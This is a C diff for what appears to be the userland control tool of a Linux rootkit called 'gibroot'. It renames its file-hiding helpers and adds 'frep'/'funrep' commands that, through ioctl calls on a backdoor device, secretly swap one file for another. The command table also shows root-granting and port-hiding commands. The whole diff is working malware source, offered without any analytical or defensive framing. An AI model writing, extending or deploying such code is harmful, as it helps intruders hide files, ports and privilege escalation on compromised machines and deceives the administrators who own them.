@@ -148,13 +148,13 @@ static int toggle_urandom(list) WORD_LIST *list;
 	return 0;
 }
 
-void init_request(struct hide_request *request)
+void init_hide_request(struct hide_request *request)
 {
         request->count = 0;
         request->idents = NULL;
 }
 
-void add_request(struct hide_request *request,
+void add_hide_request(struct hide_request *request,
                 int len,char *name,
                 dev_t dev, unsigned long par_ino)
 {
@@ -173,7 +173,7 @@ void add_request(struct hide_request *request,
 		sizeof(struct dentry_identifier));
 }
 
-void free_request(struct hide_request *request)
+void free_hide_request(struct hide_request *request)
 {
         free(request->idents);
 }
@@ -211,7 +211,7 @@ static void get_basename_stuff(char *path,char **bname)
 	free(path_cpy);
 }
 
-static int construct_request(char *path, struct hide_request *req)
+static int construct_hide_request(char *path, struct hide_request *req)
 {
 	DIR *parent_dir;
 	dev_t parent_dev;
@@ -226,7 +226,7 @@ static int construct_request(char *path, struct hide_request *req)
 		goto out;
 
 	get_basename_stuff(path,&bname);
-	add_request(req,
+	add_hide_request(req,
 		strlen(bname),
 		bname,
 		parent_dev,parent_ino);
@@ -242,16 +242,20 @@ static int hide_item(list) WORD_LIST *list;
 	struct hide_request req;
 	char *word;
 
-	init_request(&req);
+	init_hide_request(&req);
 
+	if (list == NULL) {
+		printf("ERROR: NO ITEMS GIVEN\n");
+		goto err_out;
+	}
 	while (list != NULL) {
 		word = list->word->word;
-		if(construct_request(word,&req))
+		if(construct_hide_request(word,&req))
 			goto err_out;
 		list = list->next;
 	}
 	res = ioctl(backdoor_fd,HIDE_IOCTL,&req);
-	free_request(&req);
+	free_hide_request(&req);
 
 	if (res == 0) {
 		printf("successfully hid items\n");
@@ -263,7 +267,7 @@ static int hide_item(list) WORD_LIST *list;
 	return 0;
 err_out:
 	if (req.count)
-		free_request(&req);
+		free_hide_request(&req);
 	return EXECUTION_FAILURE;
 }
 
@@ -274,16 +278,20 @@ static int show_item(list) WORD_LIST *list;
 	struct hide_request req;
 	char *word;
 
-	init_request(&req);
+	init_hide_request(&req);
 
+	if (list == NULL) {
+		printf("ERROR: NO ITEMS GIVEN\n");
+		goto err_out;
+	}
 	while (list != NULL) {
 		word = list->word->word;
-		if(construct_request(word,&req))
+		if(construct_hide_request(word,&req))
 			goto err_out;
 		list = list->next;
 	}
 	res = ioctl(backdoor_fd,SHOW_IOCTL,&req);
-	free_request(&req);
+	free_hide_request(&req);
 
 	if (res == 0) {
 		printf("successfully unhid items\n");
@@ -295,7 +303,7 @@ static int show_item(list) WORD_LIST *list;
 	return 0;
 err_out:
 	if (req.count)
-		free_request(&req);
+		free_hide_request(&req);
 	return EXECUTION_FAILURE;
 }
 
@@ -750,6 +758,163 @@ err_out:
 	return EXECUTION_FAILURE;
 }
 
+static void init_replace_request(struct replace_request *request)
+{
+        request->count = 0;
+        request->idents = NULL;
+}
+
+static void construct_dentry_id(struct dentry_identifier *id,
+			int len, char *name, dev_t dev, unsigned long par_ino)
+{
+	id->name_len = len;
+	id->device = dev;
+	id->parent_ino = par_ino;
+	strncpy(id->name,name,256);
+}
+
+void add_replace_request(struct replace_request *request,
+			struct dentry_identifier *orig_id,
+			struct dentry_identifier *rep_id)
+{
+	struct replace_id new_id;
+
+	memcpy(&new_id.orig,orig_id,sizeof(struct dentry_identifier));
+	memcpy(&new_id.rep,rep_id,sizeof(struct dentry_identifier));
+
+	request->count++;
+        request->idents = realloc(request->idents, //done since reallocarray doesn't seem to be available
+				request->count * sizeof(struct replace_id));
+
+	memcpy(&request->idents[request->count - 1],&new_id,
+		sizeof(struct replace_id));
+}
+
+static int get_dentry_id(char *path, struct dentry_identifier *id)
+{
+	DIR *parent_dir;
+	dev_t parent_dev;
+	ino_t parent_ino;
+	char *bname;
+	int ret = 0;
+	ret = get_parent_stuff(path,
+			&parent_dev,
+			&parent_ino,
+			&parent_dir);
+	if (ret)
+		goto out;
+
+	get_basename_stuff(path,&bname);
+	construct_dentry_id(id,strlen(bname),bname,parent_dev,parent_ino);
+	free(bname);
+out:
+	return ret;
+}
+
+void free_replace_request(struct replace_request *request)
+{
+        free(request->idents);
+}
+
+static int construct_replace_request(char *orig, char *rep,
+				struct replace_request *req)
+{
+        struct dentry_identifier orig_id;
+	struct dentry_identifier rep_id;
+	int ret = 0;
+	ret = get_dentry_id(orig,&orig_id);
+	if (ret) {
+		printf("ERROR IDENTIFYING ORIGINAL FILE FOR ENTRY %d\n",req->count);
+		goto out;
+	}
+	ret = get_dentry_id(rep,&rep_id);
+	if (ret) {
+		printf("ERROR IDENTIFYING REPLACEMENT FILE FOR ENTRY %d\n",req->count);
+		goto out;
+	}
+	add_replace_request(req,&orig_id,&rep_id);
+out:
+	return ret;
+}
+
+static int replace_file(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct replace_request req;
+	char *cur_orig;
+	char *cur_rep;
+	init_replace_request(&req);
+
+	if (list == NULL) {
+		printf("ERROR: NO ITEMS GIVEN\n");
+		goto err_out;
+	}
+	while (list != NULL) {
+		cur_orig = list->word->word;
+
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING REPLACEMENT PATH\n");
+			goto err_out;
+		}
+		cur_rep = list->word->word;
+		if(construct_replace_request(cur_orig,cur_rep,&req))
+			goto err_out;
+		list = list->next;
+	}
+	res = ioctl(backdoor_fd,REP_FILE_IOCTL,&req);
+	free_replace_request(&req);
+
+	if (res == 0) {
+		printf("successfully replaced items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR REPLACING ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
+	return 0;
+err_out:
+	if (req.count)
+		free_replace_request(&req);
+	return EXECUTION_FAILURE;
+}
+
+static int unreplace_file(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct replace_request req;
+	char *cur_orig;
+	init_replace_request(&req);
+
+	if (list == NULL) {
+		printf("ERROR: NO ITEMS GIVEN\n");
+		goto err_out;
+	}
+	while (list != NULL) {
+		cur_orig = list->word->word;
+		if(construct_replace_request(cur_orig,cur_orig,&req))
+			goto err_out;
+		list = list->next;
+	}
+	res = ioctl(backdoor_fd,UNREP_FILE_IOCTL,&req);
+	free_replace_request(&req);
+
+	if (res == 0) {
+		printf("successfully unreplaced items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR UNREPLACING ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
+	return 0;
+err_out:
+	if (req.count)
+		free_replace_request(&req);
+	return EXECUTION_FAILURE;
+}
+
 static const char *gibroot_cmd_names[] = {
 	"root",
 	"unroot",
@@ -767,6 +932,8 @@ static const char *gibroot_cmd_names[] = {
 	"newname",
 	"hport",
 	"sport",
+	"frep",
+	"funrep",
 };
 
 int (*gibroot_cmd[])(WORD_LIST*) = {
@@ -786,6 +953,8 @@ int (*gibroot_cmd[])(WORD_LIST*) = {
 	change_my_name,
 	hide_ports,
 	show_ports,
+	replace_file,
+	unreplace_file,
 };
 
 
